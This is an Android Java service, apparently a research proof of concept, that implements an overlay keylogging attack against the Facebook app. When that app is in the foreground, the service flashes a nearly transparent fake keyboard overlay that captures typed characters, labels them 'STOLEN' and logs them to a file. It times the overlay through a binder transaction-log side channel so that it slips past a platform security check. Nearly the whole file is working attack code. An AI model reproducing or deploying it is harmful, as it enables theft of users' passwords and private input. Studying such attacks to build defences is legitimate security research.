package com.example.quickdraw2;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.inputmethodservice.KeyboardView.OnKeyboardActionListener;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.WindowManager;

public class AttackService extends Service {
	
	private static final String TAG = "AttackService";

  private WindowManager wm;
  LayoutInflater inflater;
  ClockThread clock;
  
  KeyboardView kv;
	Keyboard k;
	
	TopPoller tp;
	QuickDrawAttack qda; //random strategy	
	QuickDrawAttack3 qda3; //side channel enhancement

  private static final boolean STRAT_RANDOM = false;
  private static final boolean STRAT_BINDER = true;
	
	private Object shLock;
	Logger logger;
	
	boolean keyboardShown;
	
	Setup1hrCb onehrcb;
	
	int attackCounter;
	
	void getKeyboard()
	{
		kv = (KeyboardView) inflater.inflate(R.layout.keyboard, null);
	    k = new Keyboard(this, R.xml.qwerty);
	    kv.setKeyboard(k);
	    kv.setOnKeyboardActionListener(new KeyActions());
	    		
	}
  

  @Override public IBinder onBind(Intent intent) {
    // Not used
    return null;
  }

  @Override public void onCreate() {
    super.onCreate();

    inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    
    wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    
    shLock = new Object();
    keyboardShown = false;
    
    attackCounter = 0;

    getKeyboard();
    
    logger = new Logger();

    MainActivity.setAss(this);
            
    onehrcb = new Setup1hrCb();
    onehrcb.kick();

    QuickDrawAttack3 qda3;
    QuickDrawAttack qda;
    
    //side channel enhancement
    if(STRAT_BINDER)
    {
      qda3 = new QuickDrawAttack3(logger);
      qda3.start();
    }
    
    //random strategy
    if(STRAT_RANDOM)
    {
      qda = new QuickDrawAttack(logger);
      qda.start();
    }

    if(STRAT_BINDER)
    {
      tp = new TopPoller(qda3, logger); //use this for side channel
    }
    else
    {
      tp = new TopPoller(qda, logger);
    }
    
    tp.start();
    
    //only used for side channel enhancement
    if(STRAT_BINDER)
    {
      clock = new ClockThread(qda3);
      clock.start();
    }
  }
  
  void showKeyboard()
	{
		WindowManager.LayoutParams params = new WindowManager.LayoutParams(
		        WindowManager.LayoutParams.WRAP_CONTENT,
		        WindowManager.LayoutParams.WRAP_CONTENT,
		        WindowManager.LayoutParams.TYPE_TOAST,
		        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
		        PixelFormat.TRANSPARENT);

		params.alpha = 0.1f;
	    params.gravity = Gravity.BOTTOM;
	    params.width = WindowManager.LayoutParams.MATCH_PARENT;
	    
	    final WindowManager.LayoutParams p2 = params;
	    
	    new Handler(Looper.getMainLooper()).post(new Runnable() {
		    @Override
		    public void run() {
		    	synchronized(shLock)
		    	{
		    		if(keyboardShown == false)
		    		{
		    			wm.addView(kv, p2);
		    			keyboardShown = true;
		    			Log.i("ATK", "attack!");
		    			attackCounter += 1;
		    			Log.i("COUNTER", "c=" + attackCounter);
		    			
		    			if(attackCounter == 2904)
		    			{
		    				Log.i("COUNTER", "AllStop");
		    				Log.i("YELLOW", "AllStop");
		    			}
		    		}
		    	}
		    }
		});
	    
	    
		
	}
	
	void hideKeyboard()
	{
		new Handler(Looper.getMainLooper()).post(new Runnable() {
		    @Override
		    public void run() {
		    	synchronized(shLock)
		    	{
		    		if(keyboardShown)
		    		{
		    			wm.removeView(kv);
		    			keyboardShown = false;
		    			Log.i("ATK", "unattack!");
		    		}
		    	}
		    }
		});
		
	}

  @Override
  public void onDestroy() {
    super.onDestroy();
    if (kv != null) wm.removeView(kv);
    tp.fin();
  }
  
  class Logger
  {
	  FileOutputStream fout;
	  public Logger()
	  {
		  fout = null;
		  try {
			fout = getBaseContext().openFileOutput("quickdraw_trials.txt", MODE_APPEND);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		  
	  }
	  
	  public void append(String s)
	  {
		  try {
			fout.write((s + ",").getBytes());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		  
	  }
	  
	  public void endTrial()
	  {
		  try {
			fout.write("\n".getBytes());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	  }
  }
  
  class KeyActions implements OnKeyboardActionListener
	{

		@Override
		public void onKey(int arg0, int[] arg1) {
			Log.i(TAG, "arg0: " + arg0);
			
			Log.i("STOLEN", String.valueOf((char) arg0));
			logger.append(String.valueOf((char) arg0));
			
		}

		@Override
		public void onPress(int arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onRelease(int arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onText(CharSequence arg0) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void swipeDown() {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void swipeLeft() {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void swipeRight() {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void swipeUp() {
			// TODO Auto-generated method stub
			
		}
		
	}
  
  //tries an attack every Rand(950, 1050) with a window of 400ms
  class QuickDrawAttack extends Thread
  {
	  boolean started;
	  boolean shouldAttack;
	  
	  Random r;
	  
	  int stay_interval = 500;
	  int [] rest_intervals = { 800, 700, 600, 500, 600, 700, 800 };
	  int [] rest_intervals2 = { 1500, 1500, 1500, 1500, 1500, 1500, 1500 };
	  int [] rest_intervals3 = { 1500, 1500, -1, 1500, 1500, -1};
	  int pointer = 0;
	  Logger lg;
	  
	  int probeCounter;
	  boolean waitPeriodOver;
	  
	  public QuickDrawAttack(Logger log)
	  {
		  	started = true;
		  	shouldAttack = false;
		  	lg = log;
		  	r = new Random();
		  	probeCounter = 0;
		  	waitPeriodOver = false;
	  }
	  
	  public void sl(int dur)
	  {
		  try {
		  Thread.currentThread().sleep(dur);
		  } catch(Exception e)
		  {
			  
		  }
	  }
	  
	  public void run()
	  {
		  
		  
		  while(started)
		  {
			  if(shouldAttack)
			  {
				  if(!waitPeriodOver)
				  {
					  sl(2000);
					  waitPeriodOver = true;
				  }
				  
				  if(probeCounter < 10)
				  {
					  Log.i(TAG, "attack!");
					  showKeyboard();
					  sl(400);
					  
					  Log.i(TAG, "unattack!");
					  hideKeyboard();
					  				  
					  /*int spacer = rest_intervals3[pointer];
					  
					  if(spacer == -1)
					  {
						  //generate a random interval in range (20, 900) ms
						  spacer = r.nextInt(900 - 20) + 20;
					  }*/
					  //int spacer = r.nextInt(1050 - 950) + 950;
					  int spacer = 600;
					  Log.i(TAG, "resting for " + spacer);
					  
					  sl(spacer);
					  
					  //pointer = (pointer + 1) % rest_intervals3.length;
					  
					  probeCounter += 1;
				  }
			  }
			  
		  }
	  }
	  
	  public void attack()
	  {
		  
		  shouldAttack = true;
		  
	  }
	  
	  public void stopAttack()
	  {
		  shouldAttack = false;
		  probeCounter = 0;
		  waitPeriodOver = false;
	  }
	  
	  public void allStop()
	  {
		  probeCounter = 0;
		  started = false;
	  }
  }
  
  //uses the side channel
  class QuickDrawAttack3 extends Thread
  {
	  boolean shouldAttack;
	  boolean shouldShow;
	  Logger lg;
	  int ad1, ad2;
	  private Object mLock;
	  int probeCounter;
	  int skippedIntervals;
	  
	  public QuickDrawAttack3(Logger _lg)
	  {
		  shouldAttack = false;
		  shouldShow = false;
		  lg = _lg;
		  ad1 = 0;
		  ad2 = 0;
		  mLock = new Object();
		  probeCounter = 0;
		  skippedIntervals = 0;
	  }
	  
	  public void attack()
	  {
		  
		  shouldAttack = true;
		  
	  }
	  
	  public void stopAttack()
	  {
		  shouldAttack = false;
		  probeCounter = 0;
		  skippedIntervals = 0;
	  }
	  
	  public void show(int sub1, int sub2)
	  {
		  
		  
		  /*synchronized(mLock)
		  {
			  ad1 = sub1;
			  ad2 = sub2;
		  
		  }*/
		  
		  shouldShow = true;
	  }
	  
	  public void run()
	  {
		  while(true)
		  {
			  if(shouldAttack)
			  {
				  if(shouldShow)
				  {
					  /*int _ad1, _ad2;
					  synchronized(mLock)
					  {
						  _ad1 = ad1;
						  _ad2 = ad2;
					  }
					  
					  sl(_ad2);
					  showKeyboard();
					  sl(500 - _ad1);
					  hideKeyboard();*/
					  
					  /*synchronized(mLock)
					  {
						  ad1 = 0;
						  ad2 = 0;
					  }*/
					  
					  //probeCounter means we try 10 times to attack
					  //in any given attack situation
					  if(probeCounter < 10 && skippedIntervals >= 5)
					  {
						  sl(30);
						  showKeyboard();
						  sl(400);
						  hideKeyboard();
						  
						  shouldShow = false;
						  
						  probeCounter += 1;
					  }
					  
					  if(skippedIntervals < 5)
						  skippedIntervals += 1;
				  }
			  }
		  }
	  }
	  
	  public void sl(int dur)
	  {
		  try {
		  Thread.currentThread().sleep(dur);
		  } catch(Exception e)
		  {
			  
		  }
	  }
  }
  
  class TopPoller extends Thread
  {
	  boolean st;
	  QuickDrawAttack3 at_binder;
	  QuickDrawAttack at_random;
	  Logger lg;

	  public TopPoller(QuickDrawAttack _atrand, Logger log)
	  {
		  st = true;		  
		  at_random = _atrand;
      at_binder = null;
		  lg = log;
	  }

    public TopPoller(QuickDrawAttack3 atb, Logger log)
    {
      st = true;
      at_binder = atb;
      at_random = null;
      lg = log;
    }
	  
	  public void fin()
	  {
		  st = false;
	  }
	  
	  public void run()
	  {
		  while(st)
		  {
			  //String topAct = Helper.getTopActivity();
			  String topAct = Helper.getTopActivity2(getBaseContext());
			  Log.i(TAG, topAct);
			  
			  if(topAct.equals("com.facebook.katana"))
			  {
				  //fire up quick draw attack
          if(STRAT_BINDER)
          {
				    at_binder.attack();
          }
          else
          {
            at_random.attack();
          }
			  }
			  else
			  {
				  //stop quick draw attack
          if(STRAT_BINDER)
          {
				    at_binder.stopAttack();
          }
          else
          {
            at_random.stopAttack();
          }

				  lg.endTrial();
			  }
			  
			  try {
				  Thread.currentThread().sleep(1000);
			  } catch(Exception e) {}
		  }
	  }
  }
  
  class Setup1hrCb
  {
	  OneHourCallback onehr;
	  Timer myTimer;
	  
	  public Setup1hrCb()
	  {
		  onehr = new OneHourCallback();
		  myTimer = new Timer();
	  }
	  
	  public void kick()
	  {
		  myTimer.schedule(onehr, 60 * 60 * 1000);
	  }
  }
  
  class OneHourCallback extends TimerTask
  {
	  public void run()
	  {
		  Log.i("COUNTER", "1 hour up!");
		  Log.i("YELLOW", "1 hour up!");
	  }
  }
  
  class ClockThread extends Thread
  {
	  private static final String CTAG = "ClockService";
	  QuickDrawAttack3 qa;
	  
	  public ClockThread(QuickDrawAttack3 q)
	  {
		  qa = q;		  
		  			
	  }
		
	  public void run()
	  {
		  ArrayList<String> tlog = new ArrayList<String>();
		  
		  int srcPid = 1326; //TODO automatically get PID 
		  int destPid = 1256; //TODO automatically get PID
		  
		  long prev_ts = 0;
		  String prev_debug_id = "";
		  		  		  
		  while(true)
		  {
			  tlog.clear();
			  String line;
			  
			  //Log.i(CTAG, "---new TLOG---");
			  
			  
			  try {
				  	FileInputStream fin = new FileInputStream("/sys/kernel/debug/binder/transaction_log");
				  	BufferedReader reader = new BufferedReader(new InputStreamReader(fin));
				  
					while(( line = reader.readLine()) != null)
					{
						tlog.add(line);					  
					}
					
					fin.close();
					reader.close();
					
					for(String s : tlog)
					{
						String [] comps = s.split(" ");
						if(comps[1].equals("call"))
						{
							String pidsrc = comps[4];
							String [] pids1 = pidsrc.split(":");
							
							int potSrcPid = Integer.parseInt(pids1[0]);
							
							String piddest = comps[6];
							String [] pids2 = piddest.split(":");
							
							int potDestPid = Integer.parseInt(pids2[0]);
							
							String debug_id = comps[0];
							String [] sizething = comps[12].split(":");
							int size = Integer.parseInt(sizething[0]);
							
							if(potSrcPid == srcPid && potDestPid == destPid && size == 72)
							{
								
								
								
								if(!debug_id.equals(prev_debug_id))
								{
									long now = System.nanoTime();
									Log.i(CTAG, "curr debug_id:" + debug_id + ", prev id:" + prev_debug_id);
									
									long delta = (now - prev_ts) / 1000000;
									
									Log.i(CTAG, "delta:" + delta);
									
									//the value of delta means that a call just went out "delta" ms ago
									//the fact we are executing here means a call just went out for
									//the security check. So a few ms later, we should show our attack window
									//for a fixed "stay interval"
									
									/*if(delta > 1100 && delta < 1300)
									{
										//this means quite some time has passed since the actual check
										//our side channel has lagged behind. we must reduce our display interval
										qa.show(250, 0);
									}
									else if(delta > 1500)
										qa.show(400, 0);
									else if(delta < 900)
										qa.show(200, 50);
									else if(delta < 1200 && delta > 800)
										qa.show(25, 0);*/
									
									if(delta >= 800 && delta <= 1200)
										qa.show(0, 0);
																			
									prev_ts = now;
									prev_debug_id = debug_id;
									
									break;
								}
								else
								{
									//the current and prev debug id match, so we just break the loop
									//coz there's no other data that we should look at 
									break;
								}							
							}			
						}
					}
					
			  } catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			  }
			  
			  
			  
			  try {
				  Thread.currentThread().sleep(50);
			  } catch(Exception e) { }
		  }
	  }
  }
}
